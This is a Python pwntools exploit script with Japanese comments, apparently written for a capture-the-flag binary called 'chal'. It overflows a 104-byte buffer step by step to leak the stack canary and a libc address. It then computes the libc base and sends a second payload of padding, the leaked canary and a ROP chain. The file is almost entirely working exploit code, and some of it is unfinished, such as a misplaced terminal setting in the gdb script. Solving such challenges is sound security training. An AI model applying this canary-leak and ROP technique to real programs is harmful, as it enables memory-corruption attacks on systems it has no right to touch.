from pwn import *

# ローカル実行
gdbscript = r'''
br puts
run 
context.terminal = ['tmux', 'splitw', '-v']  # gdb を別ターミナルで開きたい場合に調整
'''
#p = process(["./ld-linux-x86-64.so.2", "--library-path", ".", "./chal"])
p = gdb.debug("./chal", gdbscript=gdbscript, env={"LD_PRELOAD":"./libc.so.6"})   

# =====================
# 1 回目: カナリアをリーク
# =====================

libc = ELF('./libc.so.6')
elf = ELF('./chal')

rop=ROP(elf)
rop.raw(rop.find_gadget(['ret']))
rop.puts(elf.got['puts'])
#rop.main() # No main symbole
log.info(rop.dump())

payload = b"A" * 104
idx = 104
target = b""
leak_canary = b""

for i in range(256):
  p.recvuntil(b"What's your name?\n> ")
  p.send(payload)
  p.recvuntil(b"Your input is ")
  leak_line = p.recvline().strip()
  leak_byte = leak_line[idx:idx+1]
  if i == 1:
    leak_canary = b"\x00" + leak_line[105:105+7]
    print(leak_canary.hex())
  if i == 8:
    target8 = leak_line[104+8:104+16]
    print(target8.hex())
  if i == 192: #libc_main + offset
    target192 = leak_line[104+192:104+192+8]
    print(target192.hex())
  if not leak_byte:
    target += b"\x00"
  else:
    target += leak_byte

  p.recvuntil(b"Is this okay (Y/n) ?")
  p.sendline(b"n")
  idx = idx + 1
  payload += b"C"

log.success(f"Leaked canary: {target.hex()}")
p.recvuntil(b"What's your name?\n> ")

sym = "__libc_start_main"
offset = libc.sym[sym]
print(f"libc_start_main offset={hex(offset)}")
leaked_addr = int.from_bytes(target192, "little")

libc_base = leaked_addr - offset
log.info(f"libc base = {hex(libc_base)}")

# payload2 作成　カナリア＋ROP
payload2  = b"B" * 104
payload2 += leak_canary                  # 保存したカナリア
payload2 += p64(0x0)     # fake rbp (choose according to constraints)
payload2 +=rop.chain()
p.send(payload2)

p.recvuntil(b"Is this okay (Y/n) ?")
p.sendline(b"Y")

# 出力確認
print(p.recvall().decode(errors='ignore'))
p.interactive()
